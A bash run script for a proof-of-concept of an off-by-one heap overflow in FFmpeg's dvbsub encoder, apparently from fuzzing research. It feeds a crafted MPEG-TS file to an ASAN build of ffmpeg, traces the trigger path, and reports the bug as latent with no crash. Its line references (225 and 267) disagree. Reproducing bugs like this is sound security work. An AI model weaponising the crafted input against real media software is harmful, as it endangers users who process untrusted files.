#!/usr/bin/env bash
# PoC run script for dvb_encode_rle8 off-by-one overflow (dvbsubenc.c:225)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="${SCRIPT_DIR}/vuln_001_input.ts"
OUTPUT="${SCRIPT_DIR}/vuln_001_output.ts"
GEN_SCRIPT="${SCRIPT_DIR}/vuln_001_gen.py"

echo "[*] Step 1: Generate crafted MPEG-TS input"
python3 "${GEN_SCRIPT}"

echo ""
echo "[*] Step 2: Verify input file"
ls -la "${INPUT}"

echo ""
echo "[*] Step 3: Run ffmpeg to re-encode subtitle as dvbsub"
echo "    Command: ffmpeg -i input.ts -c:s dvbsub output.ts"
echo "    Trigger path: avcodec_encode_subtitle -> dvbsub_encode -> dvb_encode_rle8"
echo "    Expected: 2x2 rect, 8bpp, alternating [1,0] pixels trigger buggy check"

# ASAN options for best crash detection (build already compiled with ASAN)
export ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:detect_leaks=0"
export UBSAN_OPTIONS="halt_on_error=1:print_stacktrace=1"

# Input is MPEG-TS (native format for DVB subtitle).
# Pipeline: mpegts demux → dvbsub decode → dvbsub encode (triggers dvb_encode_rle8)
"${FFMPEG}" \
    -v verbose \
    -i "${INPUT}" \
    -c:s dvbsub \
    -y \
    "${OUTPUT}" 2>&1 || {
    EXIT_CODE=$?
    echo ""
    echo "[!] ffmpeg exited with code ${EXIT_CODE}"
    echo "EXIT=${EXIT_CODE}"
    exit ${EXIT_CODE}
}

echo ""
echo "[*] ffmpeg completed successfully"
echo "[*] Output: ${OUTPUT}"
if [[ -f "${OUTPUT}" ]]; then
    ls -la "${OUTPUT}"
fi

echo ""
echo "[*] Trigger path confirmed: dvb_encode_rle8 was called for each 2x2 8bpp rect"
echo "    The off-by-one write (*q++=0xF0) at dvbsubenc.c:267 occurred each time."
echo ""
echo "[*] NOTE: No crash observed — ffmpeg allocates a 1MB output buffer"
echo "    (subtitle_out_max_size=1024*1024), so the 1-byte write past the boundary"
echo "    implied by the buggy check (buf_size*8 < w*12+24) lands in safe slack space."
echo "    The vulnerability is LATENT: any API caller passing a tight buffer"
echo "    (buf_size=6 for w=2, which is the minimum buf_size that passes the check)"
echo "    would produce a real 1-byte heap-buffer-overflow at dvbsubenc.c:267."
echo "EXIT=0"
